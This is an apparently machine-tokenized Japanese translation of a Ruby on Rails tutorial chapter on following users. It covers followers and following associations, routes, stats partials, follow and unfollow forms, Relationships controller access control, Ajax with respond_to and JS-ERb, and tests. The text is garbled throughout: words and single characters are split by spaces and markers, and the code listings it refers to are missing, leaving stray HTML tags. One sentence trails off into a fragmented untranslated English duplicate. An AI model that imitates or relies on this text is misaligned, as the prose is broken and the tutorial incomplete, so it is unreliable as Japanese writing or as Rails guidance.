▁ 特定の 分 野 で モデリング の 経験 を 多く 積 め ば 、 このような ユ ー テ ィ リ テ ィ メソッドが 必要 になる ことを 事 前に 思い 付け るように な る でしょう 。 たとえ 思い 付け ないこと が あった として も 、 明 確 な テストを 書 こう と するときに 、 い つ の間に か こう い う メソッドを 自分 が 作成 している ことに 気 付 く ことでしょう 。
▁ だ から という わけではありません が 、 今 は このような メソッドが 必要 である ということ に 気 付け なくても 問題 ありません 。
▁ ソフトウェア の 開発 は 、 繰 り か え し に 次 ぐ 繰り返し です 。 読み づ ら くなる まで コードを 書き 足 し 、 その コードを リファクタリング する 、 その 繰り返し です 。 そして 、 より 簡潔 な コードを 書く ために 、 本書 が 少し でも お 役 に 立 て ば と思います 。
▁ 今回は 、 こういった メソッドは テスト から 先に 書い ていきます 。
▁という の も 、 Web インターフェイス など で 便 利 メソッド を使う の はまだ 先 なので 、 すぐ に \ emph { 使 え る 場 面 } が なく 、 実装 した 手 応 え を 得 にくい からです 。
▁ 一方 で 、 User モデル に対する テストを書く のは 簡単 かつ 今 すぐ できます 。 その テスト の中で 、 これらの メソッドを使って い きます 。 具体的には 、\ ko de { following ?} メソッド である ユーザーを まだ フォロー していない ことを確認 、\ ko de { follow } メソッドを使って その ユーザーを フォロー 、 ▁\ ko de { following ?} メソッドを使って フォロー 中 になった ことを確認 、 ▁最後に \ ko de { unfollow } メソッドで フォロー解除 できた ことを確認 、 といった 具 合 で テストを して きます 。
▁作成した コードをリスト \ ref { code : u t il ity _ method _ tests } に示します
▁“ following ” ▁ 関連 の メソッド をテストする
▁self を省略した 結果を リスト \ ref { code : follow _ unfollow _ following } に示します 。
▁このとき 、 可能な 限 り \ ko de { self } ▁( user 自身 を表す オブジェクト ) ▁ を省略 して いる点に注目してください 。
▁" following " ▁ 関連 の メソッド
▁ following
▁リスト \ ref { code : follow _ unfollow _ following } のコード を追加する ことで 、 テストスイート は ▁\ passing ▁ になるはずです 。
▁( end )< n >< n > ▁\ subsection { フォロワー } ▁% ▁( fold )< n > ▁\ label { sec : followers }< n >< n >
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ ko de { user . followers } メソッド を追加する ことです 。 これは 上の \ ko de { user . following } メソッドと 対 になります 。
▁ 図 \ ref { fig : user _ has _ many _ following } を見 て いて 気 付 いた 方 も いる と思います が 、 フォロワー の配列 を 展開 するために 必要な 情報 は 、\ ko de { relationships } テーブル に 既に あります
▁ したがって 、 データモデル は 図 \ ref { fig : user _ has _ many _ followers } のようになります 。
▁ Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル
▁ 図 \ ref { fig : user _ has _ many _ followers } を 参 考 に した データモデル の実装 を リスト \ ref { code : has _ many _ following _ through _ active _ relationships } に示します が 、 この 実装 は リスト \ ref { code : has _ many _ following _ through _ pass ive _ relationships } と ま さ に 類 似 しています 。
▁ 受 動的 関係 を使って \ ko de { user . followers } を実装する
▁これは \ ko de { : followers } 属性 の場合 、 Rails が ▁“ followers ” ▁ を 単数形 に して 自動的に 外部キー \ ko de { follower \_ id } を探し てくれる からです 。
▁リスト \ ref { code : has _ many _ following _ through _ active _ relationships } と 違 って 必要 の ない \ ko de { : source } キー を そのまま 残 している のは 、\ ko de { has _ many ▁: following } と の 類 似 性 を 強 調 させる ためです 。
▁self を省略した 結果を リスト \ ref { code : followers _ test } に示します 。
▁( リスト \ ref { code : followers _ test } では 、\ ko de { following ?} と 対 照 的な \ ko de { followed \_ by ?} メソッドを使って も よ か った のですが 、 サンプルアプリケーション で 実際に 使う 場 面 が なかった ので 省略 しました 。 )
▁\ ko de { followers } に対するテスト
▁リスト \ ref { code : followers _ test } では リスト \ ref { code : u t il ity _ method _ tests } に 1 行 だけ 追加 しています が 、 実際には 多くの 処理 が正しく 動 いて い なければ パス しません 。 つまり 、 リスト \ ref { code : has _ many _ following _ through _ pass ive _ relationships } の実装 に対するテスト は 、 実装 の 影 響 を 受け やすい テスト だと い え ます 。
▁ この時点で 、 全 て の テストが ▁\ passing ▁ になるはずです 。
▁ followers
▁\ ref { sec : the _ relationship _ model } では や や 複雑な データ モデリング の 技術 を 説明 しました 。 理解 するのに 時間 が か か って し ま って も 大 丈 夫 なので 、 安 心 してください 。
▁ 実際 、 使用 された さまざまな 関連付け を理解する の に 一 番 良い のは 、 Web インターフェイス で 使用 してみる ことです 。
▁ この章 の 最初に 、 フォローしているユーザー の ページ 表示 の 流れ について説明し ました 。
▁この節では 、 モックアップ で示した ように フォロー / フォロー解除 の 基本的な インターフェイス を 実装します 。
▁また 、 フォローしているユーザー と 、 フォロワー に それぞれ 表示 用の ページ を作成します 。
▁\ ref { sec : the _ status _ feed } では 、 ユーザーの ステータスフィード を追加して 、 サンプルアプリケーション を 完成 させ ます 。
▁1 つ 前 の 章 のとき と同じ ように 、 サンプルデータ を 自動 作成する Rake タスク を使用して 、 データベースに 実際の データを 登録 する の が や は り 便利です 。
▁ 先に サンプルデータ を 自動 作成 しておけば 、 Web ページの 見 た 目 の デザイン から 先に と り か か る ことができ 、 バ ッ ク エ ンド の 機能 の実装 を この節 の 後に 回 す ことができます 。
▁リスト \ ref { code : sample _ relationships } は 、 リレーションシップ の サンプルデータ を生成する ための コード です
▁ここでは 、 最初の ユーザーに ユーザー 3 から ユーザー 5 1 まで を フォロー させ 、 それ から 逆 に ユーザー 4 から ユーザー 4 1 に 最初の ユーザーを フォロー させ ます 。 ソース を見ると わかるように 、 このような 設定 を 自由に 行う ことができます 。
▁ こう して リレーションシップ を作成 しておけば 、 アプリケーションの インターフェイス を 開発 するには 十分 です 。
▁ サンプルデータ に following / follower の関係 性 を追加する
▁リスト \ ref { code : sample _ relationships } を実行して データベース 上の サンプルデータ を 作り 直 す ために 、 い つ もの コマンド を実行し ましょう 。
▁これで サンプル ユーザーに 、 フォローしているユーザー と フォロワー が できました 。 ユーザー プロファイル ページ と Home ページ を更新し て これを 反 映 しましょう 。
▁最初に 、 プロファイル ページ と Home ページに 、 フォローしているユーザー と フォロワー の 統 計 情報を 表示 するための パーシャル を作成します 。
▁次に 、 フォロー 用 と フォロー解除 用の フォーム を作成します 。 それ から 、 フォローしているユーザー の 一覧 ▁( " following ") ▁ と フォロワー の 一覧 ▁( " followers ") ▁ を表示する 専 用の ページ を作成します 。
▁\ ref { sec : a _ pro b le m _ with _ the _ data _ model } で 指 摘 した ように 、 Twitter の 慣習 に したがって フォロー 数 の 単 位 には “ following ” を 使い 、 たとえば “ 50 ▁ following ” といった 具 合 に 表示 します 。
▁この 単 位 は 図 \ ref { fig : page _ flow _ profile _ mockup } のモックアップ の一部 でも 既に 使われ ていました 。 該 当 箇所 を 拡大 して 図 \ ref { fig : st at s _ partial _ mockup } に 再 掲 します 。
▁ 統 計 情報 パーシャル のモックアップ
▁ 図 \ ref { fig : st at s _ partial _ mockup } の 統 計 情報 には 、 現在のユーザー が フォロー している 人 数 と 、 現在の フォロワー の 人 数 が表示され ています 。 それぞれの 表示 は リンク になっ ており 、 専 用の 表示 ページに 移動 できます 。
▁ 実際の ページ 作成 は \ ref { sec : following _ and _ followers _ pages } まで 行 いません が 、 ルーティング は 今 実装します ▁( リスト \ ref { code : following _ followers _ action s _ routes })。
▁ このコード では 、\ ko de { resources } \ emph { ブロック } の 内 側 で \ ko de { : member } メソッド を使用しています 。 これは 初 登 場 です ので 、 どんな 動作 を する のか 推測 してみてください 。 ▁ method ▁in s id e ▁a ▁ , ▁ w h i ch ▁we ▁ ha ve n ’ t ▁ s e en ▁ before , ▁ b u t ▁ s e e ▁if ▁you ▁c an ▁ g u ess ▁ what ▁it ▁do es .
▁ Users コントローラに \ ko de { following } アクション と \ ko de { followers } アクション を追加する
▁ / users /1/ following
▁また 、 どちら も データを \ emph { 表示する } ページ なので 、 適切な HTTP メソッドは \ text tt { GET } リクエスト になります 。 したがって 、\ ko de { get } メソッドを使って 適切な レスポンス を返す ようにします 。
▁ ちなみに 、\ ko de { member } メソッド を使うと ユーザー id が含まれ ている URL を扱う ようになります が 、
▁id を 指定 せずに すべての メンバ ー を表示する には 、 以下のように \ ko de { collection } メソッド を使用します 。
▁このコードは / users / t ig er s という URL に 応答 します ▁( アプリケーション にある すべての t ig er の リスト を表示します )
▁Rails には さまざまな ルーティング オプション があります が 、 詳 細 については Rails ガイド の 記事 「\ href { http :// guides . rubyonrails . org / routing . html } { Rails ルーティング }」 を参照してください 。
▁リスト \ ref { code : following _ followers _ action s _ routes } によって 生成される ルーティング テーブル を 表 \ ref { table : following _ routes } に示します 。
▁ ここ にある 、 フォローしているユーザー 用 と フォロワー 用の 名前付きルート を この後 使用します 。
▁ / users /1/ followers
▁ カスタム ルール で 提 供 する リスト \ ref { code : following _ followers _ action s _ routes } の RESTful ルート
▁ ルーティング を定義し たので 、 統 計 情報 の パーシャル を実装する 準備 が 整 い ました 。 この パーシャル では 、 div タグ の中に 2 つの リンク を含め るように します ▁( リスト \ ref { code : st at s _ partial })。
▁ フォロワー の 統 計 情報 を表示する パーシャル
▁</ strong >
▁ followers
▁この パーシャル は ユーザー表示ページ と Home ページの 両方 に 表示される ので 、 リスト \ ref { code : st at s _ partial } の最初の 行 では 、 以下のコード を使用して 適切な 方 を 選択 しています 。
▁ フォローしているユーザー の 人 数 と 、 フォロワー の 人 数 は 、 以下の 関連付け を使用して 計算 されます 。
▁リスト \ ref { code : user _ show _ microposts } の マイクロポストの コード と 比 較 してみましょう 。 あ のとき は 次のように 書き ました 。
▁ このコード を使用して マイクロポストの 合 計 数 を表示します 。
▁( 以前 同様 、 高速 化 のために Rails は データベース の中で 合 計 を 計算 する ようにしています 。 )
▁ 一部の 要素 で 、 以下のように CSS ▁id を指定して い ること にも ぜ ひ 注目してください 。
▁ こう しておく と 、\ ref { sec : a _ working _ follow _ button _ with _ ajax } で Ajax を実装する ときに 便利です 。 そこで は 、 一意 の id を指定して ページ 要素 にアクセス しています 。
▁ 統 計 情報 パーシャル が でき あ が り ました 。 Home ページに この 統 計 情報 を表示する のは 、 リスト \ ref { code : home _ page _ st at s } のように 簡単に できます 。
▁ Home ページに フォロワー の 統 計 情報 を追加する
▁</ section >
▁</ as id e >
▁ 統 計 情報 に スタイル を与える ために 、 リスト \ ref { code : st at s _ css } のように S CSS を追加しましょう ▁( なお 、 この S CSS には この章 で使用する スタイル が すべて 含まれています )。
▁ 変更 の 結果 、 Home ページ は 図 \ ref { fig : home _ page _ follow _ st at s } のようになります 。
▁ Home ページの サイドバー 用の S CSS
▁ Home ページに フォロー 関連 の 統 計 情報 を表示する
▁ この後 すぐ 、 プロファイル にも 統 計 情報 パーシャル を表示します が 、 今 のうち に リスト \ ref { code : follow _ form _ partial } のように フォロー / フォロー解除 ボタン 用の パーシャル も 作成 しましょう 。
▁ follow / unfollow フォームの パーシャル
▁このコードは 、\ ko de { follow } と \ ko de { unfollow } の パーシャル に 作業 を 振 っている だけです 。 パーシャル では 、 Relationship s リソース 用の 新しい ルーティング が必要です 。 これを 、 リスト \ ref { code : microposts _ resource } の Microposts リソース の例 に従って 作成 しましょう ▁( リスト \ ref { code : relationships _ resource })。
▁ Relationship リソース 用の ルーティング を追加する
▁ follow / unfollow パーシャル 自体 は 、 リスト \ ref { code : follow _ form } と リスト \ ref { code : unfollow _ form } に示します 。
▁ ユーザーを フォロー するための フォーム
▁ユーザーの ア ン フォロー する フォーム
▁これらの 2 つの フォーム では 、 いずれ も \ ko de { form \_ for } を使用して Relationship モデル オブジェクトを 操作 しています 。 これらの 2 つの フォームの 主 な 違 い は 、 リスト \ ref { code : follow _ form } は \ emph { 新しい } リレーションシップ を作成する の に 対 し 、 リスト \ ref { code : unfollow _ form } は 既存の リレーションシップ を見つけ 出 す という 点 です 。
▁ す な わ ち 、 前 者 は \ text tt { POST } リクエストを ▁ Relationship s コントローラに 送信 して リレーションシップ を \ ko de { create } ▁( 作成 ) ▁ し 、 後 者 は \ text tt { DELETE } リクエストを 送信 して リレーションシップ を \ ko de { destroy } ▁( 削除 ) ▁ する ということです
▁( これらの アクション は \ ref { sec : a _ working _ follow _ button _ the _ st and ar d _ w a y } で 実装します )。
▁ 最終的に 、 この follow / unfollow フォーム には ボタン しか ないこと を 理解 して いた だけ た と思います 。 しかし 、 それ でも この フォーム は \ ko de { followed \_ id } を コントローラに 送信 する必要があります 。
▁これ を行う ために 、 リスト \ ref { code : follow _ form } の \ ko de { h id de n \_ field \_ tag } メソッド を使用します 。 このメソッドは ▁以下の フォームの HTML を生成します 。
▁\ ref { sec : reset t ing _ the _ password } の リスト \ ref { code : password _ reset _ form } で 見 た ように 、 隠 し フィールド の \ ko de { input } タグ を使う ことで 、 ブラウザ 上 に 表示 さ せずに 適切な 情報 を含め ることができます 。
▁これで 、\ ref { code : user _ follow _ form _ profile _ st at s } のように フォロー 用の フォーム を ユーザー プロファイル ページに インクルード して パーシャル を 出力 できるようになりました 。
▁ プロファイル には 、 図 \ ref { fig : profile _ follow _ button } および 図 \ ref { fig : profile _ unfollow _ button } のように それぞれ ▁[ Follow ] 、[ U n follow ] ▁ ボタン が表示されます 。
▁ プロフィール ページに フォロー 用 フォーム と フォロワー の 統 計 情報 を追加する
▁< section >
▁</ h 1>
▁</ ol >
▁ プロフィール画面 ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ ボタン が表示されている
▁ プロフィール画面 ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }) ▁ に ▁[ U n follow ] ▁ ボタン が表示されている
▁これらの ボタン は もう すぐ 動作する ようになります 。 実は この ボタン の実装 には 2 とおり の 方法 があります 。 1 つ は 標準的な 方法 ▁(\ ref { sec : a _ working _ follow _ button _ the _ st and ar d _ w a y }) 、 もう 1 つ は Ajax を使用する 方法 ▁(\ ref { sec : a _ working _ follow _ button _ with _ ajax }) ▁ です 。 でも その 前に 、 フォローしているユーザー と フォロワー を表示する ページを それぞれ 作成 して HTML インターフェイス を 完成 させ てしまい ましょう 。
▁ フォローしているユーザー を表示する ページ と 、 フォロワー を表示する ページ は 、 いずれ も ユーザー プロファイル ページ と ユーザー インデックス ページ ▁(\ ref { sec : users _ index }) ▁ を 合わせ た ような 作り になる という 点 で 似 ています 。 どちら にも フォロー の 統 計 情報 などの ユーザー情報 を表示する サイドバー と 、 ユーザーの リスト があります 。
▁さらに 、 サイドバー には 小 さ め のユーザー プロフィール 画像 の リンクを 格 子 状 に 並 べ て 表示する 予定です 。
▁この 要求 に 合 う モックアップ を 図 \ ref { fig : following _ mockup } ▁( フォローしているユーザー 用 ) ▁ および ▁ 図 \ ref { fig : followers _ mockup } ▁( フォロワー 用 ) ▁ に示します 。
▁ フォローしているユーザー 用 ページのモックアップ
▁ユーザーの フォロワー 用 ページのモックアップ
▁ここで の最初の 作業 は 、 フォローしているユーザー の リンク と フォロワー の リンクを 動く ように することです 。
▁ Twitter に なら い 、 どちら の ページ でも ユーザーの ログイン を 要求 します 。
▁ 前 回 の アクセス 制 御 と同様に 、 まず は テスト から 書い ていきます 。 今回 使う テストは リスト \ ref { code : following _ followers _ author i z ation _ test } の とおりです 。
▁ フォロー / フォロワー ページの 認 可 をテストする
▁この 実装 には 1 つ だけ ト リ ッ キー な 部分 があります 。 それ は Users コントローラに 2 つの 新しい アクション を追加する 必要がある ということです 。
▁ これはリスト \ ref { code : following _ followers _ action s _ routes } で定義した 2 つの ルーティング にも と づ い ており 、 これらは それぞれ \ ko de { following } および \ ko de { followers } と 呼 ぶ 必要があります 。
▁ それぞれの アクション では 、 タイトル を 設定 し 、 ユーザーを 検索 し 、\ ko de {@ user . following } または \ ko de {@ user . followers } から データ を取り出し 、 ページネーション を 行 な って 、 ページ を出力する 必要があります 。
▁作成した コードをリスト \ ref { code : following _ followers _ action s } に示します
▁\ ko de { following } アクション と \ ko de { followers } アクション
▁ 一方 で 、 リスト \ ref { code : following _ followers _ action s } の いずれ の アクション も 、\ emph { render } を \ ko de { 明示的に } 呼び出し 、\ emph { show _ follow } という 同じ ビュー を 出力 しています 。 したがって 、 作成 が 必要な ビュー は これ 1 つ です 。
▁render で 呼び出し ている ビュー が 同じ である 理由 は 、 この ER b は どちら の場合 でも ほぼ 同じ であり 、 リスト \ ref { code : show _ follow _ view } で 両方 の場合 を カ バー できる ためです 。
▁ フォローしているユーザー と フォロワー の 両方 を表示する \ ko de { show \_ follow } ビュー
▁リスト \ ref { code : following _ followers _ action s } にある アクション は 、 2 通 り の 方法で リスト \ ref { code : show _ follow _ view } の ビュー を呼び出します 。 “ following ” を と お って 描画 した ビュー を 図 \ ref { fig : user _ following } に 、 “ followers ” を と お って 描画 した ビュー を 図 \ ref { fig : user _ followers } に示します 。
▁このとき 、 上のコード では カ レ ン ト ユーザーを 一 切 使って い ない 点 に 注目してください 。 したがって 、 他の ユーザーの フォロワー 一覧 ページ も うまく 動 きます ▁( 図 \ ref { fig : d if f er ent _ user _ followers })。
▁ 現在のユーザー に フォロー されている ユーザー を表示する
▁ユーザーの フォロワー を表示する
▁ 別の ユーザーの フォロワー を表示する
▁ フォロー 一覧 も フォロワー 一覧 も 動く ようになった ので 、 この 振る舞い を検証する ための 2 つの 統合テスト を 書い て い き ましょう 。
▁これらの 統合テスト を 基本的な テスト に 留 め 、 網羅 的な テスト ではありません 。
▁\ ref { sec : layout _ link _ tests } でも 指 摘 した ように 、 HTML 構造 を 網羅 的に チェック する テストは 壊 れ や す く 、 生 産 性 を 逆 に 落 と しか ね ない からです 。
▁ したがって 今回は 、 正しい 数 が表示されている かどうか と 、 正しい URL が表示されている かどうか の 2 つの テストを 書き ます 。
▁ いつものように 、 統合テスト を生成する ところ から 始 め ます 。
▁次に 、 テスト データを いくつか 揃 え ます 。 リレーションシップ 用の fixture に データ を追加しましょう 。
▁\ ref { sec : profile _ micropost _ tests } では 、 次のように 書くこと で
▁ユーザー と マイクロポストを 関連付け できた ことを思い出してください 。
▁また 、 上のコード では ユーザー名 を 書い ていました が 、
▁この 例 を 参 考 に して リレーションシップ 用の fixture に テスト データ を追加する と 、 リスト \ ref { code : relationships _ fixtures } のようになります 。
▁ following / follower をテストする ための リレーションシップ 用 fixture
▁ あ とは 、 正しい 数 かどうかを確認 するために 、\ ko de { assert \_ match } メソッド ▁( リスト \ ref { code : user _ profile _ test }) ▁ を使って プロフィール画面 の マイクロポスト 数 をテストします 。
▁さらに 、 正しい URL かどうか をテストする コード も 加 え ると 、 リスト \ ref { code : following _ tests } のようになります 。
▁ following / follower ページ のテスト
▁なお 、 リスト \ ref { code : following _ tests } では 、 次の コード を加え ています が
▁このコードは 次の コードを 確かめ るため のテスト なので 、
▁\ href { https :// en . w ikipedia . org / wiki / V a c u o us _ tr u th } { 無 意味 な テスト } では ない ことに注意してください ▁(\ ko de { followers } についても 同様 です )。
▁これで 、 テストが ▁\ passing ▁ になるはずです 。
▁ ビュー が 整 っ てきました 。 いよいよ ▁[ フォロー する ] ▁[ フォロー解除 する ] ▁ ボタン を 動作 させ ましょう 。
▁ フォロー と フォロー解除 は それぞれ リレーションシップ の作成 と 削除 に 対応 している ため 、 まず は Relationship s コントローラ が必要です 。 いつものように コントローラ を生成し ましょう 。
▁リスト \ ref { code : relationships _ controller } でも 説明します が 、 Relationship s コントローラのアクション で アクセス 制 御 すること は そこ まで 難 しく ありません 。 しかし 、 前 回 の アクセス 制 御 のとき と同様に 最初に テストを 書き 、 それ を パス する ように 実装 することで セキュリティ モデル を 確 立 させ て い き ましょう 。
▁ 今回は まず 、 コントローラのアクション にアクセス する とき 、 ログイン 済み に ユーザー である かどうかをチェックし ます 。 ▁ も し ログイン して い なければ 、 ログイン ページに リダイレクト させ 、 Relationship の カウント が 変 わ っ ていない ことを確認します ▁( リスト \ ref { code : relationships _ access _ control })。
▁ リレーションシップ の 基本的な アクセス 制 御 に対するテスト
▁次に 、 リスト \ ref { code : relationships _ access _ control } のテスト を パス させる ために 、\ ko de { logged \_ in \_ user } フィルター を Relationship s コントローラのアクション に対して 追加 します ▁( リスト \ ref { code : relationships _ controller })。
▁ リレーションシップ の アクセス 制 御
▁この すべて を 実装 した 結果を 、 リスト \ ref { code : relationships _ controller _ following } に示します 。
▁ Relationship s コントローラ
▁リスト \ ref { code : relationships _ controller _ following } を見 て み れば 、 先ほど の セキュリティ 問題 が 実は それ ほど 重 大 な もの では ないこと を 理解 いた だけ る と思います 。 も し ログイン していない ユーザーが ▁(\ ko de { c url } などの コマンドライン ツール など を使用して ) ▁これらの アクションに 直接 アクセス する ようなこと があれば 、\ ko de { current \_ user } は \ ko de { nil } になり 、 どちら の メソッド でも 2 行 目 で 例外が発生します 。 エラー には なります が 、 アプリケーション や データ に 影 響 は 生 じ ません 。
▁この ま まで も 支 障 はありません が 、 や は り このような 例外 には 頼 らない 方が よい ので 、 上で は ひ と 手 間 かけ て セキュリティ のための レ イ ヤ ー を追加し ました 。
▁これで 、 フォロー / フォロー解除 の 機能 が 完成 しました 。 どの ユーザー も 、 他の ユーザーを フォロー したり 、 フォロー解除 したり できます 。 ブラウザ 上で ボタン をクリックして 、 確かめ て みてください 。
▁( 振る舞い を検証する 統合テスト は \ ref { sec : following _ tests } で 実装します 。 )
▁ フォロー していない ユーザーの 画面
▁ ユーザーを フォロー した 結果
▁ フォロー 関連 の 機能 の実装 はこの とおり 完了 しました が 、 ステータスフィード に 取り か か る 前に もう 一 つ だけ 機能を 洗 練 させ て み たい と思います 。
▁\ ref { sec : a _ working _ follow _ button _ the _ st and ar d _ w a y } では 、 Relationship s コントローラの \ ko de { create } アクション と ▁\ ko de { destroy } アクション を 単 に \ emph { 元の } プロファイル に リダイレクト していました 。
▁つまり 、 ユーザー は プロファイル ページを 最初に 表示 し 、 それ から ユーザーを フォロー し 、 その後 すぐ 元の ページに リダイレクト される という 流れ になります 。
▁ ユーザーを フォロー した 後 、 本当に その ページ から 離 れ て 元の ページに 戻 らない と い け ない の でしょう か 。 この 点 を 考え なお してみましょう 。
▁これは \ emph { Ajax } を使用することで 解決 できます 。 Ajax を使用すれば 、 Web ページ から サーバー に 「 非 同 期 」 で 、 ページを 移動 すること なく リクエストを 送信 することができます
▁\ emph { A s y n ch r on o us ▁( 非 同 期 の ) ▁ JavaScript ▁A n d ▁ XML } の < n > それぞれの 頭 文字 を と っています 。 Ajax は し ば し ば ▁“ A J A X ” ▁ と 大文字 で 書かれ ます が 、\ href { http :// www . ad a p t ive path . com / id e as / ajax - new - app r o a ch - web - application s /}{ Ajax の 起 源 となる 記事 } では 一 貫 して ▁“ Ajax ” ▁ と な っています 。
▁Web フォーム に Ajax を 採 用 する のは 今 や 当 たり 前に なり つ つ あるので 、 Rails でも Ajax を簡単に 実装 できる ようになっています 。
▁ フォロー 用 と フォロー解除 用の フォーム パーシャル を これ に 沿 って 更新 する のは 簡単 です 。 以下のコード が あるとします 。
▁ form _ for
▁ た った これ だけで 、 Rails は \ href { http :// cat b . org / j ar g on / html / A / auto ma g ical ly . html } { 自動的に } Ajax を使用します
▁ Ajax を使った フォロー フォーム
▁ Ajax を使った フォロー解除 フォーム
▁ ER b によって 実際に 生成される HTML は それ ほど 重要 ではありません が 、 興 味 がある 方 のために 、 次に その 核 心 部分を お 見 せ します 。
▁</ form >
▁ここでは 、 form タグ の 内部で \ ko de { data - remote =" true "} 変数 を 設定 しています 。 これは 、 JavaScript による フォーム 操作 を 許可 すること を Rails に 知 ら せる ためのものです 。
▁ 以前の Rails では 完全な JavaScript コードを 挿 入 していました が 、 Rails ▁3 から この ように HTML プロ パ テ ィ を使用して 簡単に JavaScript を使用できます 。 これは 、\ href { http :// rails casts . com / e p is odes / 20 5 - un o b tr us ive - javascript }{\ emph { JavaScript を 前 面 に 出 す べ から ず } } という 哲 学 に従って います 。
▁ フォームの 更新 が 終わっ たので 、 今度は これ に対応する Relationship s コントローラ を 改 造 して 、 Ajax リクエスト に 応答 できるように しましょう 。
▁ こういった リクエスト の 種類 によって 応答 を 場合 分 け する とき は 、\ ko de { respond \_ to } メソッド という メソッド を使います 。
▁この 文法 は 少々 変 わ って いて 混 乱 を 招 く 可能性があります が 、 上の ▁( ブロック 内の ) ▁ コード のうち 、\ emph { いずれ か の 1 行 } が 実行される という 点が 重要です
▁( このため \ ko de { respond \_ to } メソッドは 、 上 から 順に 実行 する 逐 次 処理 という より 、 if 文 を使った 分 岐 処理 に 近 い イ メ ー ジ です )。
▁ Relationship s コントローラ で Ajax に 対応 させる ために 、\ ko de { respond \_ to } メソッドを \ ko de { create } アクション と \ ko de { destroy } アクション ▁( リスト \ ref { code : relationships _ controller _ following }) ▁ に それぞれ 追加 してみましょう 。
▁ 変更 の 結果を リスト \ ref { code : relationships _ controller _ ajax } に示します 。
▁このとき 、 ユーザーの ローカル変数 ▁(\ ko de { user }) ▁ を インスタンス変数 ▁(\ ko de {@ user }) ▁ に変更 した 点 に 注目してください 。 これは 、 リスト \ ref { code : relationships _ controller _ following } のとき は インスタンス変数 は 必要 なかった のですが 、 リスト \ ref { code : follow _ form _ ajax } や リスト \ ref { code : unfollow _ form _ ajax } を 実装 した ことにより 、 インスタンス変数 が 必要 になった ためです 。
▁ Relationship s コントローラ で Ajax リクエスト に対応する
▁リスト \ ref { code : relationships _ controller _ ajax } で Ajax リクエスト に 対応 した ので 、 今度は ブラウザ 側 で JavaScript が 無効 になって いた 場合 ▁( Ajax リクエスト が 送 れ ない場合 ) ▁ でも うまく 動く ようにします ▁( リスト \ ref { code : de gra de _ gra ce full y })。
▁ JavaScript が 無効 になって い たとき のための 設定
▁# ▁ 認 証 トークン を remote フォーム に 埋 め 込 む
▁ 一方 で 、 JavaScript が 有効 になって いて も 、 まだ 十分 に 対応 でき ていない 部分 があります 。
▁という の も 、 Ajax リクエストを 受信 した 場合は 、 Rails が自動的に アクション と同じ 名前 を持つ \ emph { JavaScript 用の 埋め込み Ruby } ▁(\ ko de { . js . erb }) ▁ ファイル ▁(\ ko de { create . js . erb } や \ ko de { destroy . js . erb } など ) ▁ を呼び出す からです 。
▁ ご 想 像 の とおり 、 これらの ファイル では JavaScript と 埋め込み Ruby ▁( ER b ) ▁ を ミ ッ ク ス して 現在の ページ に対する アクション を実行する ことができます 。
▁ ユーザーを フォロー した とき や フォロー解除 したときに プロフィール ページ を更新する ために 、 私 た ち が これ から 作成 および 編集 し なければならない のは 、 ま さ に これらの ファイル です 。
▁ J S - ER b ファイルの 内部で は 、 Rails が自動的に \ href { http :// jquery . com /}{ j Query } ▁ JavaScript ヘルパー を提供します 。 これにより 、\ href { http :// www . w 3 . org / D O M /}{ D O M ▁( D o c um ent ▁ Object ▁ Model ) } ▁ を使用して ページを 操作 できます 。
▁\ ref { sec : image _ validation } で 見 た ように 、 j Query ライブラリ には D O M 操作 用の 膨 大 な メソッドが 提供され ています が 、 ここで 使用する のは わずか 2 つ です 。
▁ それ には まず 、 ド ル 記 号 ▁( $ ) ▁ と CSS ▁id を使用して D O M 要素 にアクセス する 文法 について 知 る必要があります 。
▁たとえば 、\ ko de { follow \_ form } 要素 を 操作 するには 、 以下の 文法 を使用します 。
▁リスト \ ref { code : follow _ form _ partial } では 、 これは フォーム を 囲 む \ ko de { div } タグ であり 、 フォーム そのもの では なかった ことを思い出してください 。
▁ ご 想 像 の とおり 、 j Query は CSS と同様 、 ドット \ ko de { . } を使用して CSS クラス を 操作 できます 。
▁次に 必要な メソッドは \ ko de { html } です 。 これは 、 引数 の中で 指定された 要素 の 内 側 にある HTML を更新し ます 。
▁たとえば 、 フォロー 用 フォーム 全体 を \ ko de { " foo bar "} という 文字列 で 置き換え る には 、 以下 を使用します 。
▁ 純 粋 な JavaScript と異なり 、 J S - ER b ファイル では 組み込み Ruby ▁( ER b ) ▁ を使用できます 。 \ ko de { create . js . erb } ファイル では 、 フォロー 用の フォーム を \ ko de { unfollow } パーシャル で 更新 し 、 フォロワー の カウント を更新する の に ER b を使用しています ▁( もちろん これは 、 フォロー に成功した場合 の動作 です )。
▁ 変更 の 結果を リスト \ ref { code : create _ js _ erb } に示します 。
▁ このコード では \ ko de { es ca p e \_ javascript } メソッド を使用し ていることに注目してください 。 この 関数 は 、 JavaScript ファイル 内に HTML を 挿 入 するときに 実行 結果を エスケープ する ▁( 画面 に 表示 しない ) ▁ ために 必要 です 。
▁ JavaScript と 埋め込み Ruby を使って フォロー の関係 性 を作成する
▁ 各 行 の 末尾 に セ ミ コ ロ ン ▁ ; ▁ がある ことに注目してください 。 ▁これは プログラミング 言語 に よく ある 文法 で 、 古 く は 19 50 年 代 中 ご ろ に 開発 された \ href { https :// en . w ikipedia . org / wiki / A L G O L } { A L G O L } まで 遡 ります 。
▁\ ko de { destroy . js . erb } ファイルの 方 も 同様 です ▁( リスト \ ref { code : destroy _ js _ erb })。
▁Ruby ▁ JavaScript ▁( R J S ) ▁ を使って フォロー の関係 性 を削除する
▁これらの コード により 、 ユーザー プロファイル を表示し て 、 ページを 更新 せずに フォロー または フォロー解除 が できる ようになった はずです 。
▁ フォロー ボタン が 動く ようになった ので 、 バグ を 検 知 するための シンプルな テストを 書い て い き ましょう 。
▁ユーザーの フォロー に対するテスト では 、 ▁ / relationships に対して POST リクエストを 送 り 、 フォロー された ユーザーが 1 人 増え た ことを チェック します 。 具 体 的な コードは 次の とおりです 。
▁これは 標準的な フォロー に対するテスト では あります が 、 Ajax 版 も や り 方は 大 体 同じです 。 Ajax の テストでは 、\ ko de { post } の代わりに \ ko de { x h r ▁: post } を使う だけです 。
▁ここで 使っている \ ko de { x h r } ▁( X m l H tt p Request ) ▁という メソッドは 、 Ajax で リクエストを 発行する します 。 したがって 、 リスト \ ref { code : relationships _ controller _ ajax } の \ ko de { respond _ to } では 、 JavaScript に 対応 した 行 が 実行される ようになります 。
